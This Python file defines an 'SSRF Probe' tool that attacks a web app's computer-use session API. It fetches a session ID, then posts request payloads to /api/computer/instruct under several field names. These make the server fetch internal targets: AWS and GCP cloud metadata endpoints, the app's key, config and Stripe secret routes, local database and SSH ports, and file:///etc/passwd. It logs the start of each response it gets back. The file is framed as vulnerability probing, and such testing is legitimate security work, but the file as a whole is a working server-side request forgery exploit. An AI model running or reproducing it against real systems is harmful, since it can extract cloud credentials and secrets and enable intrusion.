import sys, os, argparse, urllib.parse, urllib.request, urllib.error, json

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool

def _targets(base):
    """Internal targets worth asking the server to fetch, using the live base."""
    host = urllib.parse.urlparse(base).netloc or "127.0.0.1:3456"
    return [
    f"http://{host}/api/key",
    f"http://{host}/api/config",
    f"http://localhost:{urllib.parse.urlparse(base).port or 80}/api/stripe/secret",
    "http://127.0.0.1:22",
    "http://169.254.169.254/latest/meta-data/",   # AWS IMDS
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://127.0.0.1:5432",   # Postgres
    "http://127.0.0.1:6379",   # Redis
    "http://127.0.0.1:27017",  # MongoDB
    "file:///etc/passwd",
    ]


class SSRFProbe(VibeTool):
    def __init__(self):
        super().__init__("SSRF Probe", "Server-Side Request Forgery via Computer-Use Sessions")

    def run(self, url):
        self.banner()
        base = url.rstrip("/")
        sessions_url = base + "/api/computer/sessions"

        self.log("Step 1 — Fetching active sessions...")
        status, body, _ = self.safe_request(sessions_url, method="GET")
        sessions = []
        if status == 200:
            try:
                sessions = (json.loads(body) or {}).get("sessions", [])
                self.log(f"Found {len(sessions)} active session(s)")
            except ValueError:
                self.log("Session endpoint did not return JSON", "warn")
        else:
            self.log(f"Could not fetch sessions (status={status})", "warn")

        session_id = sessions[0]["sessionId"] if sessions else "test123"
        self.log(f"Using sessionId: {session_id}")

        # The endpoint fetch key varies between apps: try the common names
        # (url/uri/target/endpoint) rather than assuming one.
        self.log("Step 2 — Probing SSRF targets via /api/computer/instruct...")
        hits = 0
        for field in ("url", "uri", "target", "endpoint"):
          for target in _targets(base):
            payload = {"sessionId": session_id, field: target}
            status, resp, _ = self.safe_request(base + "/api/computer/instruct",
                                                method="POST", data=payload)
            if status == 0:
                self.log(f"  [{field}] {target}: {resp[:50]}", "warn")
                continue
            fetched = target.lower() in resp.lower() or '"fetched"' in resp
            refused = any(marker in resp.lower() for marker in
                          ("error", "not allowed", "blocked", "invalid url", "unknown url type"))
            if status == 200 and fetched and not refused:
                self.log(f"[SSRF HIT] field={field} {target} => {resp[:120]}", "fail")
                hits += 1
            else:
                self.log(f"  [{field}] {target} => {resp[:80]}")

        if hits:
            self.log(f"CRITICAL — {hits} SSRF vector(s) confirmed.", "fail")
        else:
            self.log("No direct SSRF confirmed via instruct endpoint.", "pass")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    args = parser.parse_args()
    SSRFProbe().run(args.url)
